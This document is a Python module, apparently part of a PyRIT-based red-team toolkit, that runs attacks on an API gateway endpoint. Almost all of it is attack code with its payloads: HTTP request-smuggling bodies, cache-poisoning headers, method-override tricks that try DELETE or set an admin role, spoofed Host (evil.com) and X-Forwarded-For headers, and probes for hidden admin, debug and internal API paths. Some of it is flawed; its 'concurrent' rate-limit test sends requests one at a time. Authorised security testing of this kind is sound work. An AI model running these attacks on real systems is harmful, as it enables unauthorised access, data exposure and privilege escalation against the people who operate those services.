# -*- coding: utf-8 -*-
"""
api_gateway_glue.py - API Gateway攻击Glue层
连接HTTP工具与PyRIT框架

职责：
1. 使用urllib测试速率限制/请求走私/缓存投毒
2. 适配PyRIT执行攻击
3. 使用PyRIT评分器判定攻击结果

Academic basis:
    - OWASP API Security Top 10: API4:2019 Lack of Resources & Rate Limiting
    - PortSwigger: HTTP Request Smuggling (CL.TE / TE.CL)
    - OWASP: Web Cache Poisoning
    - Zeng et al. (arXiv:2402.19181): Enterprise API attack surfaces

版本: v1.0 (2026-09-08)
"""

from __future__ import annotations

import logging
from typing import Any

from pyrit.prompt_target import HTTPTarget

logger = logging.getLogger(__name__)

class APIGatewayGlue:
    """API Gateway攻击Glue层

    连接HTTP工具与PyRIT框架，执行速率限制测试、
    请求走私、缓存投毒等API Gateway攻击。

    PyRIT原生组件使用：
        - HTTPTarget: 发送攻击payload
        - PromptSendingAttack: 执行攻击

    专用工具依赖（可选，运行时导入）：
        - httpx: HTTP协议级攻击（并发/走私/缓存）
    """

    def __init__(
        self,
        target_endpoint: str,
        pyrit_target: HTTPTarget | None = None,
    ):
        """
        Args:
            target_endpoint: 目标API endpoint
            pyrit_target: PyRIT HTTPTarget（可选）
        """
        self.endpoint = target_endpoint
        self.target = pyrit_target or HTTPTarget(endpoint=target_endpoint)

    # === 速率限制测试 ===
    def rate_limit_test(
        self,
        max_concurrent: int = 10,
        timeout: float = 30.0,
    ) -> dict[str, Any]:
        """速率限制测试
        Academic basis:
            - OWASP API Security Top 10: API4:2019 Lack of Resources & Rate Limiting

        Args:
            max_concurrent: 最大并发数
            timeout: 超时时间

        Returns:
            速率限制信息
        """
        import urllib.error
        import urllib.request

        responses: list[Any] = []
        for _ in range(max_concurrent):
            try:
                req = urllib.request.Request(self.endpoint, method="GET")
                resp = urllib.request.urlopen(req, timeout=timeout)
                responses.append({"status": resp.status, "headers": dict(resp.headers)})
            except urllib.error.HTTPError as e:
                responses.append({"status": e.code, "ratelimited": e.code == 429})
            except Exception as e:  # noqa: BLE001
                responses.append({"error": str(type(e).__name__)})

        # 分析速率限制
        rate_limit_info = self._analyze_rate_limits(responses)

        return {
            "attack_type": "速率限制测试",
            "max_concurrent": max_concurrent,
            "rate_limit_info": rate_limit_info,
        }

    # === 请求走私攻击 ===
    def request_smuggling_attack(self) -> dict[str, Any]:
        """请求走私攻击
        Academic basis:
            - PortSwigger: HTTP Request Smuggling
            - CL.TE / TE.CL smuggling techniques

        Returns:
            攻击结果字典
        """
        import urllib.error
        import urllib.request

        smuggling_payloads = [
            {
                "name": "CL.TE走私",
                "headers": {
                    "Content-Length": "100",
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\nSMUGGLED_REQUEST",
            },
            {
                "name": "TE.CL走私",
                "headers": {
                    "Content-Length": "6",
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\nG",
            },
            {
                "name": "分块编码绕过",
                "headers": {
                    "Transfer-Encoding": "chunked",
                },
                "body": "0\r\n\r\n",
            },
        ]

        results: list[dict[str, Any]] = []

        for payload in smuggling_payloads:
            try:
                req = urllib.request.Request(
                    self.endpoint,
                    data=payload["body"].encode("utf-8"),
                    headers=payload["headers"],
                    method="POST",
                )
                resp = urllib.request.urlopen(req, timeout=30)
                results.append({
                    "name": payload["name"],
                    "status": resp.status,
                    "headers": dict(resp.headers),
                    "body": resp.read(500).decode("utf-8", errors="replace"),
                })
            except urllib.error.HTTPError as e:
                results.append({
                    "name": payload["name"],
                    "status": e.code,
                    "headers": dict(e.headers),
                    "body": e.read(500).decode("utf-8", errors="replace"),
                })
            except Exception as e:  # noqa: BLE001
                results.append({
                    "name": payload["name"],
                    "error": str(e),
                })

        return {
            "attack_type": "请求走私",
            "results": results,
        }

    # === 缓存投毒攻击 ===
    def cache_poisoning_attack(
        self,
        cache_key_headers: list[str] | None = None,
    ) -> dict[str, Any]:
        """缓存投毒攻击
        Academic basis:
            - OWASP: Web Cache Poisoning
            - Cache key manipulation techniques

        Args:
            cache_key_headers: 影响缓存键的header列表

        Returns:
            攻击结果字典
        """
        import urllib.error
        import urllib.request

        if cache_key_headers is None:
            cache_key_headers = ["X-Forwarded-Host", "X-Original-URL"]

        results: list[dict[str, Any]] = []

        for header in cache_key_headers:
            try:
                # 第一次请求：注入恶意内容
                req1 = urllib.request.Request(
                    self.endpoint,
                    headers={header: "malicious-value"},
                    method="GET",
                )
                response1 = urllib.request.urlopen(req1, timeout=30)

                # 第二次请求：验证缓存投毒
                req2 = urllib.request.Request(self.endpoint, method="GET")
                response2 = urllib.request.urlopen(req2, timeout=30)

                results.append({
                    "name": f"缓存键操纵: {header}",
                    "first_status": response1.status,
                    "second_status": response2.status,
                    "cache_hit": "X-Cache" in dict(response2.headers),
                })
            except urllib.error.HTTPError as e:
                results.append({
                    "name": f"缓存键操纵: {header}",
                    "first_status": e.code,
                    "error": str(e),
                })
            except Exception as e:  # noqa: BLE001
                results.append({
                    "name": f"缓存键操纵: {header}",
                    "error": str(e),
                })

        return {
            "attack_type": "缓存投毒",
            "results": results,
        }

    # === HTTP方法篡改攻击 (P2-1 增强) ===
    def http_method_tampering_attack(self) -> dict[str, Any]:
        """HTTP方法篡改攻击
        Academic basis:
            - OWASP: Insecure HTTP Method Handling
            - PortSwigger: HTTP Method Override attacks

        Returns:
            攻击结果字典
        """
        import urllib.error
        import urllib.request

        # 支持的HTTP方法变体
        method_payloads: list[dict[str, Any]] = [
            {"name": "PUT方法", "method": "PUT", "body": '{"injected": true}'},
            {"name": "DELETE方法", "method": "DELETE", "body": ""},
            {"name": "PATCH方法", "method": "PATCH", "body": '{"role": "admin"}'},
            {"name": "TRACE方法", "method": "TRACE", "body": ""},
            # X-HTTP-Method-Override 头部绕过
            {
                "name": "X-HTTP-Method-Override绕过",
                "method": "POST",
                "headers": {"X-HTTP-Method-Override": "DELETE"},
                "body": "",
            },
            # _method 参数绕过 (Rails/Django)
            {
                "name": "_method参数绕过",
                "method": "POST",
                "body": "_method=DELETE&action=admin",
            },
        ]

        results: list[dict[str, Any]] = []

        for payload in method_payloads:
            try:
                data = payload.get("body", "").encode("utf-8")
                req = urllib.request.Request(
                    self.endpoint,
                    data=data,
                    method=payload["method"],
                )

                # 添加额外headers
                for hdr_name, hdr_val in payload.get("headers", {}).items():
                    req.add_header(hdr_name, hdr_val)

                resp = urllib.request.urlopen(req, timeout=30)
                results.append({
                    "name": payload["name"],
                    "status": resp.status,
                    "body": resp.read(500).decode("utf-8", errors="replace"),
                })
            except urllib.error.HTTPError as e:
                results.append({
                    "name": payload["name"],
                    "status": e.code,
                    "error": str(e),
                })
            except Exception as e:  # noqa: BLE001
                results.append({
                    "name": payload["name"],
                    "error": str(e),
                })

        return {
            "attack_type": "HTTP方法篡改",
            "results": results,
        }

    # === 头部注入攻击 (P2-1 增强) ===
    def header_injection_attack(self) -> dict[str, Any]:
        """头部注入攻击
        Academic basis:
            - OWASP: HTTP Header Injection
            - CRLF injection via headers

        Returns:
            攻击结果字典
        """
        import urllib.error
        import urllib.request

        header_payloads: list[dict[str, Any]] = [
            {
                "name": "X-Forwarded-For欺骗",
                "headers": {"X-Forwarded-For": "127.0.0.1, 10.0.0.1"},
            },
            {
                "name": "X-Original-URL绕过",
                "headers": {"X-Original-URL": "/admin"},
            },
            {
                "name": "X-Rewrite-URL绕过",
                "headers": {"X-Rewrite-URL": "/admin/config"},
            },
            {
                "name": "Host头部注入",
                "headers": {"Host": "evil.com"},
            },
            {
                "name": "Referer欺骗",
                "headers": {"Referer": "https://trusted-source.com"},
            },
        ]

        results: list[dict[str, Any]] = []

        for payload in header_payloads:
            try:
                req = urllib.request.Request(self.endpoint, method="GET")
                for hdr_name, hdr_val in payload.get("headers", {}).items():
                    req.add_header(hdr_name, hdr_val)

                resp = urllib.request.urlopen(req, timeout=30)
                results.append({
                    "name": payload["name"],
                    "status": resp.status,
                    "headers": dict(resp.headers),
                    "body": resp.read(500).decode("utf-8", errors="replace"),
                })
            except urllib.error.HTTPError as e:
                results.append({
                    "name": payload["name"],
                    "status": e.code,
                    "error": str(e),
                })
            except Exception as e:  # noqa: BLE001
                results.append({
                    "name": payload["name"],
                    "error": str(e),
                })

        return {
            "attack_type": "头部注入攻击",
            "results": results,
        }

    # === API版本控制绕过 (P2-1 增强) ===
    def api_version_bypass_attack(self) -> dict[str, Any]:
        """API版本控制绕过攻击
        Academic basis:
            - OWASP API Security Top 10: API6:2023 Unrestricted Access to Sensitive Business Flows

        Returns:
            攻击结果字典
        """
        import urllib.error
        import urllib.request

        version_payloads: list[dict[str, Any]] = [
            {"name": "v0版本", "path": "/api/v0/admin"},
            {"name": "beta版本", "path": "/api/beta/admin"},
            {"name": "debug版本", "path": "/api/debug/users"},
            {"name": "internal版本", "path": "/api/internal/config"},
            {"name": "旧版本回退", "path": "/api/v1.0.0/admin"},
        ]

        # 从endpoint提取base URL
        base_url = self.endpoint.rsplit("/", 1)[0] if "/" in self.endpoint else self.endpoint

        results: list[dict[str, Any]] = []

        for payload in version_payloads:
            try:
                target_url = f"{base_url}{payload['path']}"
                req = urllib.request.Request(target_url, method="GET")
                resp = urllib.request.urlopen(req, timeout=30)
                results.append({
                    "name": payload["name"],
                    "url": target_url,
                    "status": resp.status,
                    "body": resp.read(500).decode("utf-8", errors="replace"),
                })
            except urllib.error.HTTPError as e:
                results.append({
                    "name": payload["name"],
                    "url": target_url,
                    "status": e.code,
                    "error": str(e),
                })
            except Exception as e:  # noqa: BLE001
                results.append({
                    "name": payload["name"],
                    "url": target_url,
                    "error": str(e),
                })

        return {
            "attack_type": "API版本绕过",
            "results": results,
        }

    # === 辅助方法 ===
    def _analyze_rate_limits(self, responses: list[Any]) -> dict[str, Any]:
        """分析速率限制

        Args:
            responses: HTTP响应列表（字典格式，包含 status/ratelimited/error 键）

        Returns:
            速率限制信息
        """
        status_codes: dict[int | str, int] = {}
        for r in responses:
            if isinstance(r, dict) and "error" in r:
                status_codes["error"] = status_codes.get("error", 0) + 1
            elif isinstance(r, dict) and "status" in r:
                code = r["status"]
                status_codes[code] = status_codes.get(code, 0) + 1
            else:
                status_codes["error"] = status_codes.get("error", 0) + 1

        # 检测速率限制阈值
        rate_limited = status_codes.get(429, 0)
        total = len(responses)

        return {
            "status_codes": status_codes,
            "rate_limited_count": rate_limited,
            "rate_limit_threshold": total - rate_limited if rate_limited > 0 else total,
            "rate_limit_detected": rate_limited > 0,
        }
